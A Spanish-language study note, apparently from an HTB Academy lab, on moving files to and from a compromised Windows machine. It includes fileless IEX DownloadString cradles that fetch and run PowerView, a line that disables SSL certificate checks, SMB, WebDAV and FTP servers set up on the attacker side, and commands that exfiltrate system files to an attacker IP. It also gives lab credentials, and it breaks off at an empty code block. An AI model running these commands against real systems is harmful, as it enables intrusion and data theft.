Tenemos acceso a la máquina MS02 y tenemos que descargarnos, desde esta, un archivo ubicado en Pwnbox.
Existen varios métodos:

## 1. PowerShell Base64 Encode & Decode
Dependiendo del tamaño de archivo que queramos transmitir, podríamos utilizar métodos de comunicación que no requiera comunicación de red. 
Podemos **codificar un archivo a base64** , copiar dicho código y desencriptarlo en la máquina víctima.

Utilizaremos la herramienta **md5sum**:
Codificaremos con:
```shell-session
Polika4RM@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```
De esta forma se genera un HASH md5, el cual sirve como valor de referencia. Si después de transferir el archivo a la víctima, el hash del archivo reconstruido coincide, significa que no se corrompió durante el proceso de pegado.

Paralelamente, codifico el archivo id_rsa con:
```shell-session
Polika4RM@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUE...  ....VOU1NU0ggUFJJVkFURSBLRVktLS0tLQo=
```
- -w 0 = indica que no inserte saltos de línea (`wrap=0`), es decir, que la salida esté en **una sola línea continua**.
- El ";echo" final genera un salto de línea para acabar el comando, de lo contrario, aparecería parte del promt de la terminal por error:

```
LS0tLS1CRUdJTiBPUEVOU1NI...MUFRU0tLQo=Polika4RM@htb[/htb]$
```

En la PowerShell de la máquina víctima, ejecutaremos el siguiente comando:
```
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<cadena_base64>"))
```

Finalmente, podemos verificar que el Hash coincide haciendo uso de:
```powershell-session
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

El cual nos dará una salida de este tipo:
```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

Este método se puede utilizar cuando tengo una shell interactiva con la víctima, pues, lo que escribo con mi teclado lo puedo ejecutar en dicha terminal.
La longitud máxima de caracteres de la PoweShell de Windows está limitada a 8191, pues, archivos muy grandes no los podré transmitir.

## 2. PowerShell Web Downloads
Hay firewalls que permiten el uso de métodos como el HTTP y HTTPS pero pueden ser más restrictivos a la hora de la descarga de archivos .exe.

PowerShell tiene varios métodos para aprovechar la descarga de estos contenidos:

| Método                  | Qué hace                                                                     | Sincronía* |
| ----------------------- | ---------------------------------------------------------------------------- | ---------- |
| **OpenRead**            | Devuelve los datos de un recurso como un **Stream** (flujo de bytes).        | Síncrono   |
| **OpenReadAsync**       | Devuelve los datos de un recurso como Stream sin bloquear el hilo que llama. | Asíncrono  |
| **DownloadData**        | Descarga los datos de un recurso y los devuelve como **array de bytes**.     | Síncrono   |
| **DownloadDataAsync**   | Descarga los datos y los devuelve como array de bytes **sin bloquear**.      | Asíncrono  |
| **DownloadFile**        | Descarga los datos de un recurso y los guarda en un **archivo local**.       | Síncrono   |
| **DownloadFileAsync**   | Descarga los datos y los guarda en un archivo local **sin bloquear**.        | Asíncrono  |
| **DownloadString**      | Descarga los datos de un recurso y los devuelve como **string** de texto.    | Síncrono   |
| **DownloadStringAsync** | Descarga los datos como string **sin bloquear** el hilo que llama.           | Asíncrono  |

- **Síncrono** → el comando espera a que termine la descarga antes de continuar.
- **Asíncrono** → la descarga ocurre en segundo plano, permitiendo que el script siga ejecutándose.

#### A. PowerShell – Método `DownloadFile` de `Net.WebClient`
Para descargar archivos desde una URL a un archivo local en Windows.
- **Clase utilizada:** `Net.WebClient`
- **Sintaxis básica (síncrona):**
```
(New-Object Net.WebClient).DownloadFile('<URL del archivo>', '<Ruta local de salida>')`
```

- **Ejemplo:**
```
(New-Object Net.WebClient).DownloadFile(     https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',     C:\Users\Public\Downloads\PowerView.ps1' )`
```

- **Versión asíncrona:**
`(New-Object Net.WebClient).DownloadFileAsync('<URL del archivo>', '<Ruta local de salida>')`

- **Notas importantes:**
    - `DownloadFile` → Bloquea la ejecución hasta que la descarga termine.
    - `DownloadFileAsync` → Permite que el script siga ejecutándose mientras se descarga en segundo plano.
    - Útil para transferir archivos cuando la red permite HTTP/HTTPS saliente.
    - Se puede usar en entornos donde FTP o SMB están bloqueados pero HTTP/HTTPS está permitido.

#### B. PowerShell DownloadString - Fileless Method
Permite descargar y ejecutar un script directamente en memoria sin tocar el disco. Se descarga desde internet y se ejecuta directamente en la memoria RAM.

El contenido descargado se interpreta y ejecuta directamente en la sesión de la PoweShell:

- **Uso con `Invoke-Expression` (alias `IEX`):**
```
IEX (New-Object Net.WebClient).DownloadString('<URL del script>')`
```
	- Primero, `DownloadString` descarga el script como texto.
	- Luego, `IEX` **interpreta ese texto como código PowerShell y lo ejecuta en memoria RAM** (sin guardarlo en el disco) .
	- **Resultado:** el script corre **sin guardarse en disco**.

- **Uso con pipeline:**

```
(New-Object Net.WebClient).DownloadString('<URL del script>') | IEX`
```
	- Aquí el texto descargado se envía a través del **pipe (`|`)** hacia `IEX`.
	- Funciona igual que la forma anterior: ejecuta el script en memoria, pero usa la sintaxis de pipeline.
	- Puede ser más conveniente en scripts más complejos o cuando quieres encadenar comandos.
	- Ejecuta el script **directamente en memoria**, evitando que se cree un archivo en el disco.


#### C. Invoke-WebRequest (PowerShell 3.0+)
Descarga archivos desde una URL y permite guardarlos en disco.
```
Invoke-WebRequest <URL> -OutFile <ArchivoLocal>
```
- **Notas:**
    - Más lento que `WebClient:` hace más trabajo detrás de cámaras: analiza cabeceras HTTP, cookies, codificaciones, etc.
    - Útil cuando se necesita más control sobre la solicitud HTTP.
    - Dependencias de proxy y escritura en disco pueden variar según la versión de PowerShell.


## PoweShell Download cradles
Harmj0y ha compilado una lista extensa de "PowerShell download cradles" en su repositorio de GitHub. Un _download cradle_ es una técnica que permite descargar y ejecutar código en una máquina remota utilizando una sola línea de PowerShell. Estos métodos son comúnmente empleados en pruebas de penetración y actividades de red teaming para ejecutar scripts de forma remota sin necesidad de escribir archivos en el disco.

Se puede encontrar en:
https://gist.github.com/HarmJ0y/bb48307ffa663256e239


Todas esas son **formas de descargar y ejecutar scripts o archivos en PowerShell**, pero **cambian en cómo lo hacen y en qué limitaciones tienen**. Vamos a desglosarlo:

|Método|Cómo funciona|Pros|Contras / Limitaciones|
|---|---|---|---|
|**`Net.WebClient` + `DownloadString` + `IEX`**|Descarga el script como texto y lo ejecuta en memoria|Muy simple, rápido, ampliamente compatible|Puede ser detectado si hay monitoreo de tráfico HTTP; requiere acceso directo a la URL|
|**`Invoke-WebRequest (iwr)` + `IEX`**|Descarga usando cmdlet moderno de PowerShell|Flexible: cabeceras HTTP, autenticación, cookies; soporta HTTPS nativo|Más lento que `WebClient`; puede escribir en disco si no se usa `-OutFile` correctamente; depende de versión de PowerShell|
|**`Msxml2.XMLHTTP`**|Objeto COM que hace una petición HTTP y devuelve el contenido|Funciona en versiones antiguas de Windows; ligero|No maneja cookies o autenticación avanzada; ejecución requiere `IEX` explícito|
|**`WinHttp.WinHttpRequest`**|Objeto COM que hace HTTP/HTTPS|Útil donde no hay proxy; ligero|No soporta proxy automáticamente; menos flexible para cabeceras o autenticación|
|**`InternetExplorer.Application`**|Usa IE para navegar a la URL y obtener el contenido|Puede ejecutar scripts que requieran el motor de IE|Pesado, lento, depende de IE; riesgo de pop-ups o procesos visibles; casi obsoleto|

-------------

# Common Errors with PowerShell

### 1. PowerShell – Error común con `Invoke-WebRequest`

- **Problema:**  
    Al usar `Invoke-WebRequest` para descargar un script, PowerShell intenta usar **Internet Explorer** para procesar la respuesta.  
    Si IE nunca se configuró (primera ejecución) o no está disponible, aparece este error:
    `The response content cannot be parsed because the Internet Explorer engine is not available...`
- **Solución:**  
    Usar el parámetro `-UseBasicParsing` para **tratar la respuesta como texto plano**, sin depender de IE:
    `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
- **Notas:**
    - Útil cuando solo quieres **descargar y ejecutar scripts en memoria**.
    - Evita errores relacionados con IE y funciona en entornos donde IE no está configurado.

```powershell-session
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### 2. PowerShell HTTPS Download – SSL/TLS Error**

- **Problema:** Certificado SSL no confiable al usar `DownloadString`.
- **Error típico:**
    `Could not establish trust relationship for the SSL/TLS secure channel`
    
- **Solución:** Ignorar la verificación temporalmente:
`[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} IEX (New-Object Net.WebClient).DownloadString('https://<URL>')`
- **Nota:** Solo usar en entornos controlados, ya que desactiva la seguridad SSL.


----------

# SMB Downloads
- **Qué es SMB:**  
    Protocolo de red en Windows (TCP/445) para transferir archivos entre máquinas.
- **Montar un servidor SMB desde la máquina atacante:**
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

- **Copiar un archivo desde SMB (sin autenticación):**
```
copy \\<Pwnbox-IP>\share\nc.exe
```
Este comando descarga en el directorio actual de trabajo tal archivo.
> Nota: Nuevas versiones de Windows bloquean acceso de invitados no autenticados.



# **\[IMPORTANTÍSIMO]**
## **Montar SMB con usuario y contraseña (desde máquina atacante):**
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Me aseguro que la carpeta /tmp/smbshare se haya creado, de lo contrario, ejecuto:
```
sudo mkdir -p /tmp/smbshare
sudo chmod 777 /tmp/smbshare
ls -ld /tmp/smbshare
``````

- **Conectar al SMB desde Windows:**
```
net use N: \\<Pwnbox-IP>\share /user:test test 
copy C:\ruta_del_archivo N:\
```

- **Notas importantes:**
    - Permite transferir archivos incluso si el firewall bloquea FTP o HTTP.
    - Útil para escenarios de laboratorio o pruebas de pentesting.
    - Montar la unidad (net use) ayuda a evitar errores de acceso directo.

En Linux, acudir a la carpeta siguiente para visualizar los archivos:
```
cd /tmp/smbshare
```

--------------



# FTP Downloads
Protocolo de transferencia de archivos que usa **TCP/21** (comandos) y **TCP/20** (datos).

- **Montar un servidor FTP en el atacante (Pwnbox):**
1. Instalar módulo Python:
```
sudo pip3 install pyftpdlib
```

2. Iniciar servidor FTP en el puerto 21:
```
sudo python3 -m pyftpdlib --port 21`
```

Por defecto permite **acceso anónimo** si no se define usuario/contraseña.

### 1. Transferir archivos usando PowerShell

```
(New-Object Net.WebClient).DownloadFile('ftp://<IP-Atacante>/file.txt', 'C:\Users\Public\ftp-file.txt')
```

- Descarga el archivo directamente desde el servidor FTP al destino en Windows.

### 2. Transferir archivos usando un archivo de comandos FTP
Cuando tengo **una shell limitada o no interactiva** en Windows (por ejemplo, un shell remoto que no permite teclear comandos en tiempo real), no puedes usar FTP de manera normal escribiendo comandos uno a uno.

La solución es **preparar un archivo con los comandos FTP** y decirle al cliente FTP que los ejecute automáticamente.
(Todo esto **se ejecuta desde la máquina víctima**, normalmente cuando ya tienes **una reverse shell en Windows**):
1. Crear archivo de comandos `ftpcommand.txt`:

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
```

2. Ejecutar FTP usando el archivo de comandos:
```
ftp -v -n -s:ftpcommand.txt  
```
- `-v` → modo verbose, muestra lo que pasa.
- `-n` → no intenta iniciar sesión automáticamente.
- `-s:ftpcommand.txt` → ejecuta los comandos que están en el archivo.
Esto hace que **FTP lea todos los comandos del archivo y ejecute la conexión y la descarga automáticamente**, sin que tengas que escribir nada manualmente.

3. Verificar contenido del archivo descargado:
```
more file.txt
```
Lo que pasa con la reverse shell
- Muchas reverse shells **no soportan interacción completa** con comandos que requieren "entrada manual" o que usan redirecciones (`>` o `>>`) correctamente.
- Por ejemplo, `echo open 192.168.49.128 > ftpcommand.txt` intenta crear un archivo en disco, pero si la reverse shell es limitada:
    - No puede interpretar correctamente `>` y `>>`.
    - No tiene acceso a la ruta donde se intenta crear el archivo.
    - No muestra el prompt real de cmd, así que los comandos que dependen del prompt fallan.-

**¿Por qué sí funciona `ftp -v -n -s:ftpcommand.txt?**
- En este caso **ya tienes el archivo de comandos preparado** en la víctima.
- `ftp -s:ftpcommand.txt` simplemente **lee el archivo y ejecuta las instrucciones de forma automática**, sin interacción.
- Esto evita problemas de:
    - Redirección de salida (`>` / `>>`)

-------------
# Subida de archivos

Hay situaciones donde nos interesa subir archivos desde la víctima para el atacante. Podemos utilizar:

## 1. PowerShell Base64 Encode & Decode
```
[Convert]::ToBase64String(
    (Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding Byte)
)
```

- Convierte cualquier archivo en una **cadena Base64**.
- Resultado: un texto largo que puedes copiar desde la shell de la víctima.

Como salida, se obtiene:
```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmln... ... CAgICAgICAgICAgbG9jYWxob3N0DQo=
```

Consultamos el hash md5 de dicho archivo, con:
```
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

Nos copiamos la cadena en Bas64 desde la víctima al atacante, guardándola en un archivo hosts_base64.txt.

Lo decodificamos en Linux con:
```
cat hosts_base64.txt | base64 -d > hosts_copy
md5sum hosts_copy
```

Obteniendo como salida: 
```shell-session
Polika4RM@htb[/htb]$ md5sum hosts 

3688374325b992def12793500307566d  hosts
```

De esta forma, comparando el HASH vemos que el contenido se ha mantenido.

## 2. PowerShell Web Uploads

Cuando queremos **subir archivos desde la víctima a un servidor web** usando PowerShell:
##### 1. Preparar el servidor web con soporte para uploads (desde el atacante)
- Usamos **uploadserver**, un módulo Python basado en `http.server` que permite subir archivos.
```
>sudo apt install pipx
>pipx ensurepath
>pipx install uploadserver
>python3 -m uploadserver
```
- El servidor queda disponible en `http://<IP>:8000/`.
- La página de upload se encuentra en `/upload`.
   
#### 2. Subir archivos desde la víctima con PowerShell
- Descargamos el script `PSUpload.ps1` (ubicado en: https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) en la víctima:
Ejecutamos desde la PowerShell:
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')`
```

- Ejecutamos la función de upload:
```
`Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`
```

- Resultado esperado:
```
[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts [+] 
FileHash:  5E7241D66FD77E9E8EA866B6278B2373`
```

- Funciona incluso cuando FTP o SMB están bloqueados, siempre que haya HTTP/HTTPS saliente.
- La integridad del archivo se verifica con su **hash MD5**.
- Útil para exfiltrar archivos sin usar métodos tradicionales de transferencia.

## 3. Carga de archivos usando Base64 y PowerShell

##### 1. Codificar el archivo en Base64 en la víctima
```
$b64 = [System.Convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`
```

- `Get-Content -Encoding Byte` → lee el archivo como bytes.
- `ToBase64String(...)` → convierte esos bytes en una cadena Base64.
- Resultado: `$b64` contiene todo el archivo codificado en Base64.
##### 2. Enviar el archivo al atacante vía HTTP POST
```
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`
```
- `Invoke-WebRequest` envía la cadena Base64 al servidor atacante como **cuerpo de la solicitud POST**.
- Puede sustituirse por `Invoke-RestMethod`.
##### 3. Capturar la cadena Base64 en el atacante
En la máquina atacante, ejecuto:
```
nc -lvnp 8000
``` 
##### 5. Decodificar Base64 y reconstruir el archivo
```
echo <base64> | base64 -d -w 0 > hosts`
```
- Convierte la cadena Base64 de vuelta a bytes originales.
- Guarda el archivo reconstruido en el atacante (`hosts`).
----------

# Subidas SMB

Las empresas suelen permitir tráfico saliente por **HTTP (TCP/80)** y **HTTPS (TCP/443)**, pero normalmente **bloquean SMB (TCP/445)** para protegerse de ataques. Una alternativa es usar **SMB sobre HTTP mediante WebDAV (RFC 4918)**, que permite que un servidor web funcione como servidor de archivos y admite HTTPS. Así, al intentar conectarse a un recurso compartido, el sistema primero usa SMB y, si no encuentra nada, recurre a HTTP/WebDAV.

Actores:

|Rol|Descripción|
|---|---|
|**Atacante**|Máquina que quiere subir/descargar archivos usando WebDAV o SMB. En este ejemplo: `192.168.49.128` (servidor WebDAV) y `192.168.49.129` (opcional para SMB).|
|**Víctima**|Máquina Windows que se conecta al recurso compartido para acceder o subir archivos: `C:\htb` en los ejemplos.|

> Nota: en un escenario de pruebas de penetración, **el atacante controla el servidor** y la víctima es la máquina que se conecta al recurso.

---

##### 1.  Instalación y ejecución de WebDAV en la máquina atacante
1. **Instalar módulos Python necesarios** (en máquina atacante):
```
sudo apt install pipx
pipx ensurepath 
pipx install wsgidav
pipx inject wsgidav cheroot lxml
```

2. **Ejecutar el servidor WebDAV**:    
    `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
    - `--root=/tmp`: carpeta compartida.
    - `--auth=anonymous`: acceso anónimo (para pruebas).
    - Advertencias importantes:
        - **SSL recomendado** si se activa autenticación.
        - Acceso anónimo: la raíz (`/`) permite **escritura**, `/dir_browser` permite **solo lectura**.
##### 2. Conexión desde la máquina víctima (Windows)
- **Acceder a la raíz del servidor WebDAV**:
    `dir \\192.168.49.128\DavWWWRoot`
    - `DavWWWRoot` es una palabra clave especial del shell de Windows que apunta a la raíz del WebDAV.
    - También se puede apuntar a carpetas existentes:
        `\\192.168.49.128\sharefolder`

- **Subir archivos al servidor WebDAV**:
    `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\ copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\`
##### 3. Alternativa SMB
- Si no hay bloqueos de SMB (TCP/445), se puede usar **SMB directamente** desde la máquina atacante usando `impacket-smbserver`.
- Esto sirve para subir o descargar archivos de la misma manera que WebDAV, pero usando SMB nativo.

-------------

# Subidas de archivos mediante FTP – Apuntes
##### 1. Contexto
- FTP permite **subir y descargar archivos** entre máquinas.
- Similar a SMB/WebDAV, pero utiliza el puerto **TCP/21**.
- Para permitir subidas, el servidor FTP debe habilitar permisos de escritura (`--write`).

| Rol          | Descripción                                                                   |
| ------------ | ----------------------------------------------------------------------------- |
| **Atacante** | Máquina que ejecuta el servidor FTP. En el ejemplo: `192.168.49.128`.         |
| **Víctima**  | Máquina Windows que se conecta al servidor FTP para subir archivos: `C:\htb`. |

##### 1. Configuración del servidor FTP (Atacante)
1. **Iniciar servidor FTP con Python**:
    `sudo python3 -m pyftpdlib --port 21 --write`
    - `--write`: permite que los clientes suban archivos.
    - Advertencia: asignar permisos de escritura a usuarios anónimos puede ser riesgoso.
2. **Salida típica**:
    `>>> starting FTP server on 0.0.0.0:21`
    
##### 2. Subida de archivos desde la máquina víctima (Windows)

###### a) Usando PowerShell
```
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
```
- El primer parámetro: URL del servidor FTP (atacante).
- El segundo parámetro: archivo local a subir (víctima).
###### b) Usando cliente FTP y archivo de comandos
1. Crear archivo de comandos `ftpcommand.txt`:
```
echo open 192.168.49.128 > ftpcommand.txt echo USER anonymous >> ftpcommand.txt echo binary >> ftpcommand.txt echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt echo bye >> ftpcommand.txt`


```
2. Ejecutar FTP con script:
```
ftp -v -n -s:ftpcommand.txt`
```
- `-s:ftpcommand.txt` indica al cliente que use los comandos del archivo.
- Comandos importantes dentro del script:
    - `USER anonymous`: logueo anónimo.
    - `PUT <archivo>`: sube el archivo al servidor FTP.
    
Resumen:
	La **máquina atacante** monta un servidor FTP que permite escritura.
	La **máquina víctima** se conecta para subir archivos usando PowerShell o cliente FTP.
	Este método es útil cuando se quieren transferir archivos a través de **TCP/21**, especialmente si SMB/WebDAV no están disponibles.

-----------
**QUESTIONS**
**Target(s): 10.129.191.98 (ACADEMY-MISC-MS02)**
**1. Download the file flag.txt from the web root using wget from the Pwnbox. Submit the contents of the file as your answer.

Leyendo con atención, simplemente me dice que me descargue el archivo flag.txt de la raíz de la web. 
Pues, ejecuto:

```
wget 10.129.191.98/flag.txt
```

**2.  RDP to 10.129.191.98 (ACADEMY-MISC-MS02) with user "htb-student" and password "HTB_@cademy_stdnt!". 
Upload the attached file named upload_win.zip to the target using the method of your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.

Ojo! El ejercicio me da un "upload_win.zip" que me tengo que descargar en Linux.

En primer lugar, nos tenemos que conectar por RDP a la máquina windows. 
Existen dos métodos: 
1. Ejecutamos un freerdp con: 
```
freerdp /v:10.129.191.98 /u:htb-student /p:'HTB_@cademy_stdnt!'
```
2. Desde la máquina Kali atacante, abrimos un servidor web con:
 ```
python3 -m http.server 8000   
   ```
Desde la ubicación donde se encuentra el upload_win.zip (carpeta de descargas por ejemplo).

3. Utilizamos el programa *Remmina* de KALI

Dentro del entorno WINDOWS, abrimos la POWERSHELL y ejecutamos:
```

```